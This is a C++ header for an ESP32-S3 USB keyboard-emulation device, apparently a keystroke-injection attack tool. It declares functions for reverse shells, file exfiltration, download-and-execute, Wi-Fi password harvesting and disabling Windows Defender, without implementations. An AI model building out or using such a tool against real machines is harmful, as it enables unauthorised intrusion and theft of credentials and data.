/**
 * USB HID Keyboard Emulation for MCT2032
 * Simplified version for ESP32-S3 USB OTG
 */

#ifndef USB_KEYBOARD_H
#define USB_KEYBOARD_H

#include <Arduino.h>
#include <string.h>

class USBKeyboard {
private:
    bool initialized;
    uint32_t typing_delay;
    
public:
    USBKeyboard();
    
    // Initialization
    bool begin();
    void end();
    bool isInitialized();
    
    // Basic keyboard functions
    void pressKey(uint8_t key);
    void releaseKey(uint8_t key);
    void releaseAll();
    void tapKey(uint8_t key);
    void typeString(const char* str);
    
    // Command execution
    void executeCommand(const char* cmd, bool pressEnter = true);
    void openRun();           // Windows+R
    void openTerminal();      // Open cmd on Windows
    void openPowerShell();    // Open PowerShell
    
    // Attack payloads
    void runNetworkScan();
    void harvestSystemInfo();
    void harvestWifiPasswords();
    void createReverseShell(const char* ip, uint16_t port);
    void exfiltrateFile(const char* filepath, const char* destUrl);
    void downloadAndExecute(const char* url);
    
    // Stealth functions
    void disableDefender();
    void lockWorkstation();
    void minimizeAllWindows();
    void takeScreenshot();
    
    // Settings
    void setTypingDelay(uint32_t delay_ms);
    
private:
    // Helper functions
    uint8_t charToKeycode(char c);
    bool needsShift(char c);
    void pressModifier(uint8_t modifier);
    void releaseModifier(uint8_t modifier);
};

// Key modifier definitions
#define KEY_MOD_LCTRL  0x01
#define KEY_MOD_LSHIFT 0x02
#define KEY_MOD_LALT   0x04
#define KEY_MOD_LGUI   0x08
#define KEY_MOD_RCTRL  0x10
#define KEY_MOD_RSHIFT 0x20
#define KEY_MOD_RALT   0x40
#define KEY_MOD_RGUI   0x80

// Key definitions - using Arduino USB HID keyboard codes
// These match the USBHIDKeyboard library definitions
#define KEY_LEFT_CTRL    0x80
#define KEY_LEFT_SHIFT   0x81
#define KEY_LEFT_ALT     0x82
#define KEY_LEFT_GUI     0x83
#define KEY_RIGHT_CTRL   0x84
#define KEY_RIGHT_SHIFT  0x85
#define KEY_RIGHT_ALT    0x86
#define KEY_RIGHT_GUI    0x87

#define KEY_UP_ARROW     0x52
#define KEY_DOWN_ARROW   0x51
#define KEY_LEFT_ARROW   0x50
#define KEY_RIGHT_ARROW  0x4F
#define KEY_BACKSPACE    0x2A
#define KEY_TAB          0x2B
#define KEY_ENTER        0x28
#define KEY_ESC          0x29
#define KEY_INSERT       0x49
#define KEY_DELETE       0x4C
#define KEY_PAGE_UP      0x4B
#define KEY_PAGE_DOWN    0x4E
#define KEY_HOME         0x4A
#define KEY_END          0x4D
#define KEY_CAPS_LOCK    0x39
#define KEY_F1           0x3A
#define KEY_F2           0x3B
#define KEY_F3           0x3C
#define KEY_F4           0x3D
#define KEY_F5           0x3E
#define KEY_F6           0x3F
#define KEY_F7           0x40
#define KEY_F8           0x41
#define KEY_F9           0x42
#define KEY_F10          0x43
#define KEY_F11          0x44
#define KEY_F12          0x45
#define KEY_SPACE        0x2C

// Character keys
#define KEY_A            0x04
#define KEY_B            0x05
#define KEY_C            0x06
#define KEY_D            0x07
#define KEY_E            0x08
#define KEY_F            0x09
#define KEY_G            0x0A
#define KEY_H            0x0B
#define KEY_I            0x0C
#define KEY_J            0x0D
#define KEY_K            0x0E
#define KEY_L            0x0F
#define KEY_M            0x10
#define KEY_N            0x11
#define KEY_O            0x12
#define KEY_P            0x13
#define KEY_Q            0x14
#define KEY_R            0x15
#define KEY_S            0x16
#define KEY_T            0x17
#define KEY_U            0x18
#define KEY_V            0x19
#define KEY_W            0x1A
#define KEY_X            0x1B
#define KEY_Y            0x1C
#define KEY_Z            0x1D

// Number keys
#define KEY_1            0x1E
#define KEY_2            0x1F
#define KEY_3            0x20
#define KEY_4            0x21
#define KEY_5            0x22
#define KEY_6            0x23
#define KEY_7            0x24
#define KEY_8            0x25
#define KEY_9            0x26
#define KEY_0            0x27

// Symbol keys
#define KEY_MINUS        0x2D
#define KEY_EQUAL        0x2E
#define KEY_LEFT_BRACKET 0x2F
#define KEY_RIGHT_BRACKET 0x30
#define KEY_BACKSLASH    0x31
#define KEY_SEMICOLON    0x33
#define KEY_QUOTE        0x34
#define KEY_GRAVE        0x35
#define KEY_COMMA        0x36
#define KEY_PERIOD       0x37
#define KEY_SLASH        0x38

#endif // USB_KEYBOARD_H